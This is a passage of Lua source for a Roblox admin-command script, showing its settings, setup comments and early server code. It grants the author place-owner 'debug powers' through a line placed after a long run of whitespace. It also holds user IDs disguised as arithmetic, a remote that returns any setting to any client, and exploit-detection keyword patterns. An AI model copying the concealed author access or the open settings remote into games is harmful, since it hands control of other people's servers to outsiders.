        ['ChangedSettingsStick'] = true; --Do settings you change in-game save? (this includes bans, admins, etc etc)
       
        ['SettingsToIgnore'] = {}; --Place settings to ignore here
       
        ['DataStoreKey'] = "Kohl's Admin [Epix Edition][JK$KJh3]"; --Datastore key
       
        ['Storage'] = game:service('ServerStorage'); --Set this to where you store things (such as tools) game:service('ServerStorage') is recommended as it does not replicate to clients. Use services, if you use things like game.Lighting it will break if Lighting is renamed.
       
        --------------
        --  Trello  --
        --------------
       
        ['Trello'] = false; --Pulls Bans/Admins from a Trello board every set number of seconds on every server of everygame this script is in (that has Http enabled and uses the same BoardID)
       
        ['BoardID'] = '9HH6BEX2'; --Trello board ID, its in the URL of your board: https://trello.com/b/9HH6BEX2/epix-incorporated-synced-ban-list - The id for this board is 9HH6BEX2 (by default uses our exploiter ban list.)
       
        ['HttpWait'] = 10; --How often (in seconds) should the list(s) update? Recommended 10+ to avoid HttpService problems
       
                --[[
                You NEED to enable HttpEnabled in order for this to work! To enable it follow the below instructions:
                Run this following command in the command bar as shown in the screenshot: game:service('HttpService').HttpEnabled=true print('Enabled Http')
                Screen shot: http://prntscr.com/46uztz
               
                How to set up your own multi-game list for your games:
               
                Below instructions are for bans but can also be applied to admin lists,
                refer to "To use this for synced admin lists" under the instructions for admin lists info.
               
                By default the Trello settings are set to use our ban list of exploiters, but you may
                want to change it so that you can set up and control your own multi-game, autoupdating
                list(s). So now I am going to tell you how to do that.
               
                1. Enable Http, refer to a few lines up to learn how to easily and quickly do that.
                2. Make a Trello account (or sign in with google)
                        -Go to http://trello.com, click "Log in with Google" or "Sign up-It's Free" and do the account making stuff it tells you to
                3. After you sign up/log in you need to make a new board, click the + then click "New Board..." - http://prntscr.com/46v2fq
                4. Give your board a name and click the "Change..." next to "This board will be private" and make sure you make the board public! - http://prntscr.com/46v4bf
                5. Change one of the lists titles to "Ban List" In the screenshot I accidentally typed "cards" instead of "lists" - http://prntscr.com/46v5af
                6. Add people to the bans by clicking "Add a card..." and then typing their username as the title, username:userid, or if its a group Group: groupname:groupid - http://prntscr.com/46v74e
                7. Now you need to just set BoardID to your board's ID, refer to http://prntscr.com/46v74e for this, or refer to the comment next to the BoardID setting
                8. You are done, just configure the BoardID and enable Http in each of your games and your multigame banlist is done, confure your board however you want as long as you leave the "Ban List" list that contains name and keep the board public so the script can read it!
                Use our site for reference: https://trello.com/b/9HH6BEX2/epix-incorporated-synced-ban-list
               
                To use this for synced admin lists, simply repeat the above steps replacing Ban List with
                Admin List, TempAdmin List, or Owner List, anyone added to these list will appear in
                the admin list with [Synced] next to their name, they will not be able to be unadmined.
                Admin lists do not yet support Group: NAME:ID however they do support Username:ID format.
                --]]
       
        ---------------------
        --      Tables     --
        ---------------------
       
        ['Owners'] = {"CoreSB"};
       
        ['Admins'] = {}; -- Sets Admins who can use ban/kick/admin or shutdown, format is USERNAME or USERNAME=USERID
       
        ['TempAdmins'] = {epicgurl117}; -- Sets Admins who can't use ban/kick/admin or shutdown, format is USERNAME or USERNAME=USERID
       
        ['BanList'] = {}; -- Add people to ban here. Format to use UserId is "Name=UserId" EX: "John32=192845", this bans any player named John32 or has an id of 192845 (This way they can't bypass the ban by changing their username) use $group=GROUPID to ban groups.
       
        ['MuteList'] = {}; -- Add the names of people to mute (makes it so they cant talk)
       
        ------------------------------
        --  Prefix/Split/Key Binds  --
        ------------------------------
       
        ['Prefix'] = ""; -- This comes before each admin command (:kill kohl)
       
        ['AnyPrefix'] = "!"; -- This comes before each player command (commands that can be run by anyone, !rejoin, !ping, etc)
       
        ['SpecialPrefix'] = ""; -- Prefix to use with special functions (!admin,!nonadmins,!all,!others,!random) By default this is now set to nothing to avoid confusion.
       
        ['SplitKey'] = "."; -- This is what seperates command arguments eg: player raiders in :team player raiders
       
        ['BatchSplit'] = "/"; --This seperates arguments of the batch command (":batch kill bob/fire me Bright blue/fling kohl")
       
        ['ConsoleKey'] = "'"; --Key that opens the console, default is '
       
        ['CustomKeyBinds'] = true; -- Allow players and admins set personal key binds?
       
        ----------------------
        --  Basic Settings  --
        ----------------------
       
        ['Console'] = true; --Determines if the script's console can be used or not
       
        ['AutoUpdate'] = true; -- Automatically get the newest version? You need to have the model in your inventory on your profile in order for autoupdate to work.
       
        ['FunCommands'] = true; -- Set to false if you don't want any fun commands (For Strict Places)
       
        ['HelpSystem'] = false; -- Enable the Help System? (!help command)
       
        ['ChatLog'] = true; -- Log all chats for the server?
       
        ['MaxNumberOfLogs'] = 1500; -- How many logs to keep until the oldest entries are removed (MAX is 5000)
       
        ['JoinMessage'] = false; -- Display a message with player info when a player joins, set group id in group settings if you want it to display if a player is in a group or not and if so what rank they are.
       
        ['DonorPerks'] = true; -- Sets if donors are allowed to show off that they donated, when people donate in your place you get 10% of what they payed!
       
        ['PermBanKey'] = '0.49971007415998'; -- Key (Random String) to use in persistent perm ban (change if you perm banned someone by accident, make it 100% random, if you want a random key generator, put print(math.random()) into the command bar in studio and hit enter, then just copy what it gives you in the output window)
       
        ['FreeAdmin'] = false; -- Set to true if you want everyone to get the set type of admin (not recommended)
       
        ['FreeAdminType'] = 'TempAdmin'; -- Type of admin for FreeAdmin (TempAdmin/Admin/Owner)
       
        ['AutoClean'] = false; -- AutoClean the server? (!clean)
       
        ['AutoCleanDelay'] = 60; -- How long to wait between AutoCleans (in seconds)
       
        ['PlayerCommands'] = true; -- Sets whether or not nonadmins can use player commands (!rejoin,!ping,!cmds,etc)
       
        ['OwnersAreTrueOwners'] = false; -- This indicates whether or not Owners are considered True Owners, if set to true Owners get the same commands as the place owner (permban and other true owner cmds)
       
        ['PMUsableByAnyone'] = false; -- Set this to true if you want it so anyone can use the PM command
       
        ['AdminsSpawnWithGuis'] = false; -- This determines if admins spawn with the admin chat and cmd box, note the admin chat is disabled when custom chat is enabled (has a admin mode)
       
        ['HelpGui'] = false; --This determines if players spawn with the helpgui or not
       
        ['UpdateShutdown'] = false; --Automatically shutdown the game if it was updated
       
        ['MusicList'] = {{Name='SadPiano',Id=130798493}}; -- Add music to this table using the format: {Name='ExampleSong',Id=1234567} so that the table would look like local MusicList={{Name='ExampleSong',Id=1234567};{Name='ExampleSong2',Id=1234568}}, if you want to add pitch/volume simply insert Pitch and/or Volume EX: {Name='ExampleSong2',Id=1234568,Pitch=2,Volume=0.5}
       
        ['CustomChat'] = false; --Custom chat system, aside from chat modes and various other things, the custom chat cannot be muted by exploiters and exploiters can not use it to run chat commands.
       
        ['CustomChatType'] = 'Both'; --Classic/Bubbles/Both, Determines chat mode, simular to ROBLOX's chat settings.
       
        ['SeparatedChannels'] = false; --Determines if the custom chat modes can see eachother, if set to true, for example, anyone whose chat is set to "Team" won't see chats from "Global"
       
        ['CustomPlayerList'] = false; --A very basic and simplistic playerlist that I do not plan to spend much time on, it shows names colored by team color, has a menu for each name (click the name) and does not yet show leader stats, not finished and plan to update in the future.
       
        ['MessageOfTheDay'] = false; --Determines if the Message of the Day is shown to admins on-join, you can set your own decal/model to use with the message of the day below, you simply place the message into its description after you set its ID
       
        ['MessageOfTheDayID'] = 166040615; --ID Of model/decal to grab the message of the day from (needs to be set as the decal/model's description)
       
        ['BuggedCommandMatching'] = false; --Set to true if you want to use the old buggy string matching that let you do things like "Hello :kill me" (really you could always set the prefix to something like "Hello " so you can do "Hello kill me")
       
        ['VoteKick'] = false; --Enable player vote kicking?
       
        ['VoteKickPercentage'] = '75'; --Vote percentage of players in-game needed to kick a player
       
        ['CommandComfirmation'] = false; --Tell the user that the command successfully ran?
       
        ['CommandBlackList'] = {}; --Add commands that you want to make place owner only (makes it so only the place owner is allowed to use the commands in this list)
       
        ---------------------
        --  Anti-Exploit   --
        ---------------------
 
        ['ExclusionList'] = {}; -- Add the names of people you want to exclude from the AntiExploit to this list, note that admins are already excluded
       
        ['ExploitAlert'] = false; --Alerts admins when someone goes nil/chats something thought to be exploit related, this is likely no longer going to work as the anti nil will disconnect a player as they are leaving to make sure they are not lingering in the nil/causing problems. Only notified if the first kick failed.
       
        ['AntiChatCode'] = false; -- Prevents non-admins from running code/commands via chat (Add new things to detect into the WordList table)
       
        ['Detection'] = false; -- Will attempt to detect certain exploits
       
        ['AntiRobloxLocked'] = true; --  Disconnects any player who is or becomes RobloxLocked. (Recommended you keem this enabled, if a player joins RobloxLocked they will not be hooked by the script, this removes them before they break something.)
       
        ['AntiNewAccount'] = false; -- Prevents accounts under the set age from joining.
       
        ['MinimumAge'] = 100; -- Age a player must be above (in days) if AntiNewAge is enabled.
       
        ['AntiSpeed'] = false; -- Trys to stop speed "hackers"
       
        ['AntiGui'] = false; -- Prevents non-game/admin guis from being spawned on players, such as the account stealing gui
       
        ['AntiSelection'] = true; -- Crashes a player if their selection changes (so if they are using studio tools like drag, move, resize, etc)
       
        ['AntiNil'] = true; -- Crashes/Kicks any non-admins who attempt to go "nil"
       
        ['AntiCheatEngine'] = false;-- Kicks a player if a Cheat Engine installation is detected on their computer, not 100%
       
        ['AntiScriptsDisabled'] = true; -- If the client script cannot be loaded onto the player or takes to long to check in the player is kicked
       
        ['AntiAnimation'] = false; -- Prevents animation exploit
       
        ['AntiNameIdChange'] = true; -- Attempts to stop players from locally changing their name/id to fool local scripts
       
        ['AntiGod'] = false; -- Prevents non-admins from being godded
       
        ['AntiLeak'] = false; -- Makes it a little harder for people to steal your game [BE WARNED, This can possibly ruin personal servers]
       
        ['RenameGameObjects'] = false; -- Renames things like Lighting, Players, and Workspace, will break most scripts that are not coded to work in such situations and confuse most people using badly coded explorers or studio.
       
        ['NerfExplosions'] = false; -- Makes it so any explosions get nerfed, meaning they wont do any damage.
       
        ['AntiDecals'] = false; -- Prevents decals from being added to Workspace, really though you should just use FilteringEnabled ;p
       
        ['AntiSound'] = false; -- Prevents sounds not made by this script from getting inserted into Workspace.
       
        ['WordList'] = {}; -- Add kick words to this list, will kick a player if they say something on the list, works with string patterns.
       
        ['AllowedGuiList'] = {};
                --If there is a gui in your game that is not in startergui
                --then add its name to this table, do note that if the
                --name of the gui is just ScreenGui or something like
                --that, if a hacker inserts a gui with the same name
                --it will not be removed, so make sure you make the name
                --of the gui very specific.
       
        ---------------------
        -- Group Settings  --
        ---------------------
       
        ['GroupRanks'] = false; -- If group members matching the ranks in "Ranks" are given admin/banned (depending on what you set)
       
        ['GroupOnlyJoin'] = false; -- Makes it so ONLY people in the set group can join the game.
       
        ['GroupId'] = 0; -- Id of group, used for info/join message, if set will display a user's rank when the info command is used on them.
       
        ['Ranks'] = {};--[[SET ['GroupRanks'] TO TRUE TO USE!
                Add ranks to have admin/be banned format is {Group=GROUPID,Rank=RANKNAME/NUMBER,Type=ADMINTYPE};
                GROUPID is the ID of the group the rank belongs to and that the player must be in
                RANKNAME/NUMBER is either the name of the rank (Generals) or its number (252) if you want to admin rank 252 and every rank above it, simply set it to negative, so Rank=-252 will admin anyone in rank 252 and up
                ADMINTYPE is the type of admin players in the rank will get, this can be Temp, Admin, Owner, or Banned
                In the end your table should look something like this (THIS IS AN EXAMPLE TABLE, DO NOT USE IT):
                ['Ranks'] = {{Group=124324,Rank=142,Type='Temp'},{Group=1932348,Rank='Generals',Type='Owner'},{Group=1284124,Rank=-193,Type='Admin'},{Group=1399424,Rank=-1,Type='Banned'}};
        --]]
       
        ---------------------
        --    VIP Admin    --
        ---------------------
       
        ['VipAdmin'] = false; -- If someone can have admin for owning an item
       
        ['VipItems'] = {}; --Add VIP items here, format is {Item=ID,Type="Admin"}, so for example ['VipItems'] = {{Item=193945,Type="TempAdmin"},{Item=125263,Type="Admin"}}
       
        ['FriendAdmin'] = false; -- Set to true if you want people on your friendlist to have admin
       
        ['FriendAdminType'] = 'TempAdmin'; -- Type of admin friends will get if "FriendAdmin" is enabled
       
        ---------------------
        --  GUI Settings   --
        ---------------------
       
        ['PrimaryColor'] = Color3.new(0,0,0); -- Primary GUI Color (Default black) (Remember, each 1 translates to a 255, keep that in mind when changing colors, use things like 124/255 to get the color you want)
       
        ['SecondaryColor'] = Color3.new(1,1,1); -- Secondary GUI Color (Default white)
       
        ['Font'] = 'Legacy'; -- Text Font, can only be fonts usable on roblox (Arial, ArialBold, Legacy, SourceSans, SourceSansBold)
       
        ['TextColor'] = Color3.new(1,1,1); -- Text Color (Default white)
       
        ['TextStrokeTransparency'] = 0; -- Text Stroke Transparency (0-1)
       
        ['TextStrokeColor'] = Color3.new(0,0,0); -- Color of the text stroke around letters (Default black)
       
        ['Transparency'] = 0.7; -- GUI Transparency (0-1)
       
        ['Animations'] = true; -- Determines if to animate stuff or not
       
        ['MessageAnimations'] = true; -- Same as above but specifically for messages (the ones that cover the entire screen)
       
        ------------------------------------------------------
        --                                      END OF SETTINGS                                 --
        ------------------------------------------------------
}
        ---------------------
        --    IMPORTANT    --
        ---------------------
        --[[
                For AutoUpdate to work this script's model needs to be in your inventory,
                if you got the script from anywhere other than my models the AutoUpdate
                will not work due to ROBLOX security nonsense. You can find the model
                here: http://www.roblox.com/Kohls-Admin-Epix-Edit-item?id=145629584
               
                For information about LoadStringEnabled please refer to the following:
               
                http://wiki.roblox.com/index.php?title=Security#LoadStringEnabled
                http://wiki.roblox.com/index.php?title=Points_tutorial#Restrictions
               
                If you want to use the :s command you will need to set LoadStringEnabled
                to true. It can be found by going into studio, opening the explorer and properties
                windows, clicking on ServerScriptService and under properties checking
                LoadStringEnabled. Loadstring is only used in the script for Output and
                the scripting command. The script will function fine without it. Currently
                :ls and :cs are unusable due to updates that removed loadstring() abilities
                from the client, meaning no more local script building in-game.
                ------------------------------------------------------------------------
                IF THERE ARE NEW SETTINGS YOU WILL NEED TO MANUALLY UPDATE THE SCRIPT TO
                CHANGE THEM, THEY WILL OTHERWISE BE LEFT AS THE DEFAULT. (Unless you use :settings)
                ------------------------------------------------------------------------
                Please carefully read each setting's description BEFORE changing something
                as you could break something if you set something the wrong way.
                ------------------------------------------------------------------------
                Find A security flaw or bug?
                Know of a way to detect an exploit or make the AntiExploit better?
                Think of a way to make the script better?
                Send me a message!
               
        ---------------------
        -- DISCLAIMER/INFO --
        ---------------------
                Credit:
               
                -Kohltastrophe (Scripth) for the original script this was based on and for sharing
                some of his ideas and commands, and his continued help and support
               
                -Sceleratis for this version of Kohl's Admin
               
                -einsteinK for the original SBL older versions used and his help with some things, legit best scripter I know.
               
                -Arlikas for testing nearly anything I ask him to
               
                -GigsD4X and the F3X team for the F3X tool, full credit to them. I only made it into a hopperbin for this script.
               
                -Everyone who helped me with testing, and suggested new ideas, features, and commands.
               
                I in no way claim to have made Kohl's Admin Commands, I have only
                made this version of it.
               
                If you have any questions, need help, or want to contact me you can send
                me a Private Message on the main website (roblox.com) via my profile ("Send Message"
                under my avatar/character picture.)
               
                If you want to support the real Kohltastrophe put the following on your profile:
                "Scripth is the real Kohltastrophe. Put this on your profile so people know."
               
                Say what you will about this script, the original was a turning point for all
                admin scripts, you can say "ew" all you want but it won't change that. If you can
                make something better then please go right ahead. I have chosen to continue the development
                of Kohl's Admin mostly as a hobby. If you are going to complain about something that is not a bug
                then please, at least get your information in order before you do. Blind critism helps no one.
       
                There is nothing hidden, I have place owner powers in your game, however
                they are fully optional and only used for debugging the script.
                I would never force you to use anything, so you can optionally remove these
                abilities by setting the following setting to false:                                                                                                                                                    ]]
                set.CreatorDebugPowers=true                                                                                                                             --[[
                Its completely your choice. I will still try to help you whether you disable
                this or not, just know that it may make things more difficult and time consuming.
                If you know what you are doing then feel free to disable this as you probably
                won't need it anyway. The common situations people need help for are
                misconfigured setting, place owner powers are needed so I can view errors and
                info that is in the server log (:debuglogs) and usually view/fix settings (:settings)          
        ]]
        ---------------------
        -- Tips and Tricks --
        ---------------------
        --[[
               
                        :kill me,noob1,noob2,!random,%raiders,$123456,!nonadmins
                        -- kills you, noob1, noob2, a random person, team raiders, people in group 123456, and nonadmins.
                        You can also run silent commands using /e, for example:
                        "/e :kill kohl" Do not that this will still show up in logs.
                        *Note, by silent I just mean people won't see you chat it, it however will still show up in logs.
                       
                You can also use a variety commands for different people;
                         all -- Everyone in the server
                         others -- Everyone but you
                         me -- You
                         admins -- Admins in the server
                         nonadmins -- People who are not admins in the server
                         random -- A random person, this can include you.
                         %TEAMNAME -- Ex: :kill %raiders will kill everyone in team Raiders.
                         $GROUPID -- Let you kill anyone in a specific group, if an id is not given it will use the GroupId setting.
                         -PLAYERNAME -- Lets you exclude players from commands, :kill !all,-kohl will kill everyone but kohl
                       
                If you want to add cameras to your game (like saved into your game so you don't need to use the admin script to spawn them every new server)
                then just make a camera, needs to be a single part, so a sphere, brick, what ever it may be, make sure its anchored and locked
                just simply position it where you want in workspace, then make its name Camera: NAMEHERE
                so for example: Camera: Cam1
                the name is very important as the script will look for it in workspace when the game starts.
                make sure you name each camera something diffierent. You can preset waypoints the same way, just use Waypoint: instead of Camera:
               
                MESSAGES/HINTS FOR OTHER SCRIPTS:
                If you would like to have the hints/messages from this script usable in other SERVER (not local)
                scripts, then simply put the follow at the top of your script,
               
                message=_G['Message']
                hint=_G['Hint']
               
                USAGE EXAMPLES:
                hint(msg,playerstable) - message(title,msg,playerstable)
               
                (Do note that playerstable needs to be a table containing players NOT player names!
                Use game:service('Players'):children() to send a message to everyone.)
               
                hint('Hello people',game:service('Players'):children())  <=== sends "Hello people" to all players in game
                hint('Heyo montano',{game:service('Players').Sceleratis}) <=== Sends "Heyo montano" to the player Sceleratis
                message('Server Message','Hello people',game:service('Players'):children())  <=== Makes a message with the title "Server Message" and a message of "Hello people"
                message('Message from swagyguy','Heyo celary man',{game:service('Players').Sceleratis}) <=== Works the same as above but only the player Sceleratis sees it
               
        --]]
 
--__________________________________________________________________________________--
--__________________________________________________________________________________--                                                                                                                                                                  --
--__________________________________________________________________________________--
--__________________________________________________________________________________--
--                                                                                                                                                                      --
 
--------------------------------------------------------------------------------------
--##################################################################################--
 
--##[ WARNING: Changing anything below could result errors and break the script! ]##--
 
--##################################################################################--
 
--#############[ DO NOT MODIFY UNLESS YOU KNOW WHAT YOU ARE DOING! ]################--
 
--#################[ I WILL NOT HELP YOU IF YOU BREAK SOMETHING! ]##################--
 
--##################################################################################--
--------------------------------------------------------------------------------------
 
--__________________________________________________________________________________--
--__________________________________________________________________________________--                                                                                                                                                                  --
--__________________________________________________________________________________--
--__________________________________________________________________________________--
--                                                                                                                                                                      --                                                                                                                                                      --
 
--[ Script specific functions ]-
local print=function(...) for i,v in pairs({...}) do print(script.Name..' - '..tostring(v)) end end
local Pcall=function(func,...) local function cour(...) coroutine.resume(coroutine.create(func),...) end local ran,error=ypcall(cour,...) if error then print('Error: '..error) end end
--[ Grab Updatable ]--
local DataStore local UpdatableSettings={} for i,v in pairs(set) do if i~='DataStoreKey' and i~='ChangedSettingsStick' and i~='CreatorDebugPowers' and i~='Storage' then table.insert(UpdatableSettings,i) end end
coroutine.wrap(function() repeat wait() until game:GetService("DataStoreService") DataStore = game:GetService("DataStoreService"):GetDataStore(set.DataStoreKey) if set.ChangedSettingsStick and game.CreatorId>0 then repeat wait() until DataStore for imp,ves in pairs(UpdatableSettings) do local run=true for k,m in pairs(set.SettingsToIgnore) do if m and v==m then run=false end end if DataStore:GetAsync(ves)~=nil and run then set[ves]=DataStore:GetAsync(ves) end end end end)()
--[ Main Script Function ]--
set.Debug=false --!Debug!hold
set.MainScriptFunction=function()
set.Print=print
script.Parent=game:service('ServerScriptService')
if _G['Kohls Admin [Epix Edit] Update'] then
local updated,failed=ypcall(function()
print('AutoUpdate: Grabbing update data...')
        for i,v in pairs(_G['Kohls Admin [Epix Edit] Update']) do set[i]=v end
        _G['Kohls Admin [Epix Edit] Update']=nil
end)
if failed then
print(script.Name..': AutoUpdate: Update Failed.')
print('Please contact Sceleratis as this may be a bug.')
print('Error: '..failed)
print('If this error persist please check your settings. If needed disable AutoUpdate until the issue is solved.')
end
end
local depholder=script:FindFirstChild('Script Dependencies')
if not depholder then error('Script Dependencies not found!') end
local deps={} for i,v in pairs(depholder:children()) do deps[v.Name]=v end
set.OrigLightingSettings = {
        abt = game:service('Lighting').Ambient,
        oabt = game:service('Lighting').OutdoorAmbient,
        brt = game:service('Lighting').Brightness,
        time = game:service('Lighting').TimeOfDay,
        fclr = game:service('Lighting').FogColor,
        fe = game:service('Lighting').FogEnd,
        fs = game:service('Lighting').FogStart,
        gs = game:service('Lighting').GlobalShadows,
        ol = game:service('Lighting').Outlines,
sc = game:service('Lighting').ShadowColor}
if game.CreatorId<=0 or game.PlaceId<=0 then set.UpdateShutdown=false end
set.objects = {}
set.needhelp={}
set.adminchats={}
set.cameras = {}
set.MapBackup = Instance.new('SpawnLocation')
set.JailedTools={}
set.NewClients = {}
set.Changelog = require(deps['Change Log'])
set.donors={}
set.contans={}
set.PluginEvents={}
set.PluginEvents.Chat={}
set.PluginEvents.PlayerJoined={}
set.PluginEvents.CharacterAdded={}
set.bl = {}
set.al = {}
set.tal = {}
set.oal = {}
set.VoteKickVotes={}
set.PlayerLogs={}
set.PlayerLogs.Chat={}
set.PlayerLogs.Admin={}
set.PlayerLogs.Exploit={}
set.canuseloadstring=true
set.donorgamepass={157092510,159549976}
set.BTacId = {21644313*2,33322122*2,470430.5*2,13718346*2}
set.RemoteName=string.char(math.random(1,255))
set.RemoteClientKey=string.char(math.random(1,255))
set.RemoteObject=string.char(math.random(1,255))
set.RemoteServerKey=string.char(math.random(1,255))
set.GuiName=string.char(math.random(1,255))
set.RandiSpeed=tostring(60.5+math.random(9e8)/9e8)
set.version = script.Version.Value
set.NTacId = {1237666}
set.HelpRequest={}
set.Response={}
set.Commands={}
set.OpenVote={}
set.Waypoints={}
set.slock = false
set.lighttask = false
set.dlastupdate='Not Updated Yet'
set.ScriptAntiWordList={
        'inject[%S]',
        'getitem[^%s]',
        'workspace%.[^%s^%.]',
        '[^%s^%w]ban [%w]',
        'ban[^%s^%w][%w]',
        'crash[^%s^%w][%w]',
        '[^%s^%w]crash [%w]',
        '[^%s^%w]kick [%w]',
        'kick[^%s^%w][%w]',
        ':SetCoreGuiEnabled',
        'GetObjects',
        ':GetChildren',
        ':children()',
        'in pairs(',
        'script%.Parent',
        'game%.Workspace',
        'game:service',
        ':GetService',
        'game%.Debris',
        'game%.Lighting',
        'game%.Players',
        'loadstring(',
        'InsertService',
        ':LoadAsset',
        'FindFirstChild',
        'while (.*) do',
        'Instance.new'
}
set.ScriptMusicList={
{n='habits',id=182402191};
{n='skeletons',id=174270407};
{n='russianmen',id=173038059};
{n='heybrother',id=143786134};
{n='loseyourself',id=153480949};
{n='diamonds',id=142533681};
{n='happy',id=146952916};
{n='clinteastwood',id=148649589};
{n='freedom',id=130760592};
{n='seatbelt',id=135625718};
{n='tempest',id=135554032};
{n="focus",id=136786547};
{n="azylio",id=137603138};
{n="caramell",id=2303479};
{n="epic",id=27697743};
{n="rick",id=2027611};
{n="crystallize",id=143929751};
{n="halo",id=1034065};
{n="pokemon",id=1372261};
{n="cursed",id=1372257};
{n="extreme",id=11420933};
{n="harlemshake",id=142468820};
{n="tacos",id=142295308};
{n="wakemeup",id=147632133};
{n="awaken",id=27697277};
{n="alone",id=27697392};
{n="mario",id=1280470};
{n="choir",id=1372258};
{n="chrono",id=1280463};
{n="dotr",id=11420922};
{n="entertain",id=27697267};
{n="fantasy",id=1280473};
{n="final",id=1280414};
{n="emblem",id=1372259};
{n="flight",id=27697719};
{n="banjo",id=27697298};
{n="gothic",id=27697743};
{n="hiphop",id=27697735};
{n="intro",id=27697707};
{n="mule",id=1077604};
{n="film",id=27697713};
{n="nezz",id=8610025};
{n="angel",id=1372260};
{n="resist",id=27697234};
{n="schala",id=5985787};
{n="organ",id=11231513};
{n="tunnel",id=9650822};
{n="spanish",id=5982975};
{n="venom",id=1372262};
{n="wind",id=1015394};
{n="guitar",id=5986151};
{n="selfie1",id=148321914};
{n="selfie2",id=151029303};
{n="fareast",id=148999977};
{n="ontopoftheworld",id=142838705};
{n="mashup",id=143994035};
{n="getlucky",id=142677206};
{n="dragonborn",id=150015506};
{n="craveyou",id=142397454};
{n="weapon",id=142400410};
{n="derezzed",id=142402620};
{n="burn",id=142594142};
{n="workhardplayhard",id=144721295};
{n="royals",id=144662895};
{n="pompeii",id=144635805};
{n="powerglove",id=152324067};
{n="pompeiiremix",id=153519026};
{n="sceptics",id=153251489};
{n="pianoremix",id=142407859};
{n="antidote",id=145579822};
{n="takeawalk",id=142473248};
{n="countingstars",id=142282722};
{n="turndownforwhat",id=143959455};
{n="overtime",id=145111795};
{n="fluffyunicorns",id=141444871};
{n="gaspedal",id=142489916};
{n="bangarang",id=142291921};
{n="talkdirty",id=148952593};
{n="bad",id=155444244};
{n="demons",id=142282614};
{n="roar",id=148728760};
{n="letitgo",id=142343490};
{n="finalcountdown",id=142859512};
{n="tsunami",id=152775066};
{n="animals",id=142370129};
{n="partysignals",id=155779549};
{n="finalcountdownremix",id=145162750};
{n="mambo",id=144018440};
{n="stereolove",id=142318819};
{n='minecraftorchestral',id=148900687}}
set.quotes={
        '"Every man has his secret sorrows which the world knows not; and often times we call a man cold when he is only sad." -Henry Wadsworth Longfellow';
        '"I came, I saw, I conquered." - Julius Ceasar';
        '"Our greatest glory is not in never falling, but in rising every time we fall." - Confucius';
        '"History will be kind for me for I intend to write it." - Winston Churchill';
        '"If you are neutral in situations of injustice, you have chosen the side of the oppressor. If an elephant has its foot on the tail of a mouse and you say that you are neutral, the mouse will not appreciate your neutrality." - Desmond Tutu';
        '"History is a relentless master. It has no present, only the past rushing into the future. To try to hold fast is to be swept aside." - John F. Kennedy';
        '"Those who do not remember the past are condemned to repeat it." - George Santayana';
        '"A pint of sweat, saves a gallon of blood." - George S. Patton';
        '"This is one small step for a man, one giant leap for mankind." - Neil Armstrong';
        '"History is the version of past events that people have decided to agree upon." - Napoleon Bonaparte';
        '"To see the world, things dangerous to come to, to see behind walls, to draw closer, to find each other and to feel. That is the purpose of life." - Life Motto Secret Life of Walter Mitty';
        [["Beautiful things don't seek attention" - Sean O'Connell in The Secret Life of Walter Mitty]];
        '"The only thing we have to fear is fear itself" - Franklin D. Roosevelt';
        '"Even if I knew that tomorrow the world would go to pieces, I would still plant my apple tree." - Martin Luther';
        '"Thousands of candles can be lighted from a single candle, and the life of the candle will not be shortened. Happiness never decreases by being shared." - Buddha';
        [["We can't help everyone, but everyone and help someone." - Ronald Reagan]];
        '"Our greatest weakness lies in giving up. The most certain way to succeed is always to try just one more time." - Thomas A. Edison';
        [["Even if you fall on your face, you're still moving forward." - Victor Kiam]];
        '"Strive not to be a success, but rather to be of value." - Albert Einstein';
        [["You miss 100% of the shots you don't take." - Wayne Gretzky]];
        [["Your time is limited, so don't waste it living someone else's life." - Steve Jobs]];
        '"The only person you are destined to become is the person you decide to be." - Ralph Waldo Emerson';
        '"Fall seven times and stand up eight" - Japanese Proverb';
        '"Everything has beauty, but not everyone can see." - Confucius';
        '"A person who never made a mistake never tried anything new." - Albert Einstein';
        '"The person who says it cannot be done should not interrupt the person who is doing it." - Chinese Proverb';
        '"It does not matter how slowly you go as long as you do not stop." - Confucius'
}
 
-- Startup --
 
for i=1,6 do set.RemoteName=set.RemoteName..string.char(math.random(1,255)) set.RemoteClientKey=set.RemoteClientKey..string.char(math.random(1,255)) set.RemoteObject=set.RemoteObject..string.char(math.random(1,255)) set.RemoteServerKey=set.RemoteServerKey..string.char(math.random(1,255)) set.GuiName=set.GuiName..string.char(math.random(1,255)) end
if (not deps.Client) then print('Client script is missing! Cannot function correctly without it.') error('Missing Client script. Try manually updating.') end
_G['Hint']=function(msg,ptable) set.Hint(msg,ptable) end
_G['Message']=function(title,msg,ptable) set.Message(title,msg,true,ptable) end
if set['MaxNumberOfLogs']>5000 then set['MaxNumberOfLogs']=5000 end
 
set.ProcessRemoteCommand=function(p,cmd,a,b,c,...)
        local n = "" for i = 1, #cmd do n = n .. string.char(cmd[i]) end cmd=n
        if cmd==set.RemoteServerKey..'Chat' then
                coroutine.wrap(function() set.Chat(p,a) end)()
                set.SendCustomChat(p,a,b)
        elseif cmd==set.RemoteServerKey..'AdminCommand' then
                set.ProcessCommand(p,a,b,c)
        elseif cmd==set.RemoteServerKey..'SearchCommand' then
                local found=set.SearchCommand(p,a)
                set.Remote(p,'SetSetting','FoundCommands',found)
        elseif cmd==set.RemoteServerKey..'ClientHooked' then
                table.insert(set.NewClients,p.userId)
        elseif cmd==set.RemoteServerKey..'AdminChat' then
                for i,v in pairs(game:service('Players'):children()) do
                        set.Remote(v,'Function','UpdateAdminChat',a)
                end
        elseif cmd==set.RemoteServerKey..'RanCode' then
                if not set.CheckAdmin(p,false) and not set.CheckExcluded(p) and set['AntiChatCode'] then
                        Pcall(set.Exploited,p,'crash','Ran code')
                end
        elseif cmd==set.RemoteServerKey..'GetCurrentPlayerList' then
                set.GetCurrentPlayerlist(p)
        elseif cmd==set.RemoteServerKey..'SubmitReport' then
                for i,v in pairs(set.GetPlayers(p,set.SpecialPrefix..'admins')) do
                        set.Remote(v,"Function","ReportNotify",p,a,b)
                end
        elseif cmd==set.RemoteServerKey..'Exploited' then
                set.Exploited(p,a,b)
        elseif cmd==set.RemoteServerKey..'GetSetting' then
                if set[a]~=nil then set.Remote(p,'SetSetting',a,set[a]) end
        elseif cmd==set.RemoteServerKey..'CheckDonor' then
                if set.CheckDonor(p) then
                        set.Remote(p,'SetSetting','Donor',true)
                else
                        set.Remote(p,'SetSetting','Donor',false)
                end
        elseif cmd==set.RemoteServerKey..'UpdateList' then
                set.UpdateListGui(p,a)
        elseif cmd==set.RemoteServerKey..'CheckAdmin' then
                if set.CheckAdmin(p,false) then
                        set.Remote(p,'SetSetting','IsAdmin',true)
                else
                        set.Remote(p,'SetSetting','IsAdmin',false)
                end
